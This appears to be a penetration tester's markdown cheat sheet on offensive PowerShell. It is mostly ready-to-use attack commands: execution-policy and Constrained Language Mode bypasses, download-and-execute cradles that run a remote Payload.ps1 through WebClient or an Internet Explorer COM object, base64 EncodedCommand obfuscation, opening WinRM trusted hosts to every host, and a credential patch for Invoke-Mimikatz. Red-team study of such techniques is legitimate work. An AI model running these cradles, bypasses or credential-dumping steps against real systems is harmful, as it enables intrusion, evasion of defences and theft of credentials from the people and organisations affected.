# Powershell

## From .NET
- Don't forget the Bypass policy (i.e. PS>Attack...)
```
PowerShell ps = PowerShell.Create();
ps.AddScript("Set-ExecutionPolicy -Scope Process -ExecutionPolicy Unrestricted; Import-Module " + Strings.invokeObfuscationModulePath);
ps.Invoke();
ps.AddScript(cmd);
result = ps.Invoke()[0].ToString();
```

## General
### Usage
```
Get-Help <command>
Get-Help <command> -Examples
Get-Help <command> -Parameter <parameter>
<command> -Verbose
```
### Alias
```
Get-Alias -Definition Get-ChildItem
Alias      dir -> Get-ChildItem
Alias      gci -> Get-ChildItem
Alias      ls -> Get-ChildItem
```
### Cmdlets
- Kind of created function which can be called from a script and returns a .NET object
- List the Cmdlets
```
Get-Command -CommandType cmdlet
```

### Execution policy
```
Get-ExecutionPolicy
```
- Only used when executing a script (copy/paste the script within a Powershell prompt will work)
- Only aims to ensure the script was not launched by inadvertence, this is not a security feature
```
powershell -ExecutionPolicy bypass
powershell -ep bypass
powershell -c <command>
powershell -encodedcommand
$env:PSExecutionPolicyPreference="bypass"
```

- https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/

### Modules
- Import and listing
```
Import-Module <module>.psd1
ou
. <module>.ps1
```

- List the module commands
```
Get-Command -Module <module>
```

### Constrained Language Mode
A nice protection blocking some hacky methods like IEX...

#### Check if the Constrained Language mode is enabled:
```
$ExecutionContext.SessionState.LanguageMode
-> ConstrainedLanguage (Fuck...)
-> FullLanguage (Good !)
```

#### Trying to bypass it
1. Downloading [PowerShdll](https://github.com/p3nt4/PowerShdll)
2. Infiltrating the DLL into the system (with a python -m SimpleHTTPServer for example)
3. Executing it
```
rundll32 .\PowerShdll.dll,main -w
```

## Script execution
### Download execute cradle
- Without proxy
```
IEX (New-Object Net.WebClient).DownloadString("https://webserver/Payload.ps1")
```

- With proxy
```
$browser = New-Object Net.WebClient
$browser.Proxy.Credentials = [Net.CredentialCache]::DefaultNetworkCredentials
IEX ($browser).DownloadString("https://webserver/Payload.ps1")
```

- Within COM objects
```
$ie=New-Object -ComObject InternetExplorer.Application;$ie.visible=$False;$ie.navigate('https://webserver/Payload.ps1');sleep 5;$response=$ie.Document.body.innerHTML;$ie.quit();iex $response
```

### EncodedCommand
- Shitty obfuscation method
- Also IEX cradle
- Preparing the encoded command:
1. Bash
```
echo "<commande>" | iconv --to-code UTF-16LE | base64 -w 0
```

2. Python
```
from base64 import b64encode
b64encode('<commande>'.encode('UTF-16LE'))
```

3. Powershell
```
$Command = <commande>
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Command)
$EncodedCommand = [Convert]::ToBase64String($Bytes)
```

- Now run it:
```
powershell.exe -EncodedCommand $EncodedCommand
```

### Invoke-CradleCrafter
https://github.com/danielbohannon/Invoke-CradleCrafter

## PS-Remoting via WinRM (Enter-PSSession)
1. Powershell Remoting may not be able on the system by default:
```
Enable-PSRemoting -Force
```

2. By default, Kerberos authentication is enabled. This method is only suitable for a given computer in a same domain or trust domain (name can be suffixed). However, it does not support cross-domain, extra-domain or IP addresses. If you want to cross-domain, or specify an IP address to execute, execute the following code on the client here, add all or a single remote host in the trust table:
```
Set-Item wsman:\localhost\client\trustedhosts *  
```

3. List the commands we can execute on a remote system
```
help * -Parameter computername
```

4. If you want to use other credentials than our user:
```
$Username = "<domaine>\<user>"
$PasswordPlain = "<password>"
$Password = ConvertTo-SecureString $PasswordPlain -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential -ArgumentList $Username, $Password
```

5. Execute the script:

*-Credential $Cred* only required if you followed the step 3.
- Within a PS-Session
```
$sess = New-PSSession -ComputerName <address> -Credential $Cred
PS C:\Windows\system32> Invoke-Command -FilePath <script_path> -Session $sess
PS C:\Windows\system32> Enter-PSSession -Session $sess
[<address>]: PS C:\<path> <notre_commande>
[<address>]: PS C:\<path> Exit-PSSession
```
- Via Invoke-Command
```
Invoke-Command -ComputerName <server> -Credential $Cred -ScriptBlock { <PS_block> }
```

6. Do not forget to flush the added trusted hosts:
- Every trusted hosts
```
Clear-Item WSMan:\localhost\Client\TrustedHosts
```

- Only a specific one:
```
$newvalue = ((Get-ChildItem WSMan:\localhost\Client\TrustedHosts).Value).Replace("<added_host>,","")
Set-Item WSMan:\localhost\Client\TrustedHosts $newvalue
```

## Invoke-Mimikatz.ps1
- WinRM but no Credential argument :'(
- Have to add one:
```
$Username = "<domaine>\<user>"
$PasswordPlain = "<password>"
$Password = ConvertTo-SecureString $PasswordPlain -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential -ArgumentList $Username, $Password

If ($ComputerName -eq $null -or $ComputerName -imatch "^\s*$")
{
    Invoke-Command -ScriptBlock $RemoteScriptBlock -ArgumentList @($PEBytes64, $PEBytes32, "Void", 0, "", $ExeArgs) -Credential $Cred
}
Else
{
    Invoke-Command -ScriptBlock $RemoteScriptBlock -ArgumentList @($PEBytes64, $PEBytes32, "Void", 0, "", $ExeArgs) -ComputerName $ComputerName -Credential $Cred
}
```
